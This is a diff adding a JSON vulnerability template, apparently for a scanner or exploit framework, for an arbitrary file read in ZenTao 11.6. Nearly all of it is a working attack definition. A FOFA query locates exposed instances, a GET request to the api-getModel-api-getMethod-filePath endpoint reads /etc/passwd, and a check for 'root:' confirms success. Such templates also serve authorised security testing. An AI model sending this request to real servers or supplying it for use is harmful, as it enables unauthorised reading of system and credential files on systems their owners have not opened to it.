@@ -1,0 +1,33 @@
+{
+  "product": "禅道",
+  "vul_name": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "禅道 11.6 api-getModel-api-getMethod-filePath 版本中对用户接口调用权限过滤不完善，导致调用接口导致任意文件读取漏洞。",
+  "version": "禅道 11.6",
+  "note": "",
+  "search": {
+    "FOFA": "\"禅道项目管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://zhuanlan.zhihu.com/p/621635874",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/api-getModel-api-getMethod-filePath=/etc/passwd/1"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "root:"
+        }
+      ]
+    }
+  }
+}
